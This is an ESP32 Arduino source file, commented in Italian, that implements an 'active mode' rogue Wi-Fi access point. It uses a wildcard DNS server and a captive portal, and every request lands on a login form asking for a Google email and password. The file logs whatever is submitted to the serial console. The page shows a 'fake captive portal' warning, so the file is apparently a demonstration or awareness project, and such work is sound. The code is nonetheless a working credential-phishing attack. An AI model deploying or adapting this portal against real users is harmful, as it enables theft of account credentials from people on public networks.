/*

ACTIVE MODE 

*/

DNSServer dnsServer;
AsyncWebServer httpServer(80);

// access point generato dall'esp
char *ssid_esp ="debug_wifi";
char *psw_esp = "";  // the password need to be long at least 


void loopCore1(void* p){
  setupESPLocalNetwork(ssid_esp,psw_esp,IPAddress(8,8,8,8), IPAddress(8,8,8,8), IPAddress(255,255,255,0));
  // handle dns response
  while (true){
    dnsServer.processNextRequest();
    vTaskDelay(1000 / portTICK_PERIOD_MS);

  }
}


const char index_html[] PROGMEM= R"rawliteral(
  <html>
    <head>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Login</title>
      </head>
    
    <body>
      <h1>Login</h1>
      <p></p>
      <h1>FAKE CAPTIVE PORTAL</h1>
      <p>This login is fake, please don't trust public wifi</p>
      <form action="/login">
        Your email Google : <input type="email" name="email"></input><br>
        Password : <input type="password" name="password"></input>
        <input type="submit"></input>
      </form>
    </body>
  </html>
)rawliteral";

const char login_html[] PROGMEM=R"rawliteral(
      <html>
      <head>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Login</title>
      </head>
      <body>Connecting...<br> 
        <a href="/">Turn back</a></body>
      </html>
      )rawliteral";

class CaptiveRequestHandler : public AsyncWebHandler{
  public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}
    
    bool canHandle(AsyncWebServerRequest *request){
      return true; // gestisce tutte le richieste
    }
    void handleRequest(AsyncWebServerRequest *request){
      // questo fa in modo che il server rimandi immediatamente alla pagina iniziale
      request->send_P(200,"text/html",index_html);
    }
};

void setupServerPages(){
  // si setta il comportamento per ogni singola pagina
  httpServer.on("/", HTTP_GET, [](AsyncWebServerRequest *r){
    r->send_P(200,"text/html",index_html);
  });

  httpServer.on("/login",HTTP_GET,[](AsyncWebServerRequest *r){
    String inputEmail="";
    String inputPassword="";

    if (r->hasParam("email")){
      inputEmail=r->getParam("email")->value();
    }
    if (r->hasParam("password")){
      inputPassword=r->getParam("password")->value();
    }

    Serial.println("[CORE 1] -> USER DATA: "+ inputEmail+ " "+ inputPassword);

    r->send(200,"text/html",login_html);
  });


  httpServer.onNotFound([](AsyncWebServerRequest *r){
    r->redirect("/");
  });
}


void setupESPLocalNetwork(char* ssid,char* psw,IPAddress accesspoint,IPAddress gateway,IPAddress subnet){
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(accesspoint,gateway,subnet);
  while (!WiFi.softAP(ssid,psw)){
    vTaskDelay(750 / portTICK_PERIOD_MS);

    Serial.println("[CORE 1] -> ...");
  }
  dnsServer.start(53, "*", WiFi.softAPIP());
  httpServer.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  setupServerPages();
  httpServer.begin();
  Serial.println("[CORE 1] -> ESP router IP "+WiFi.softAPIP().toString());
}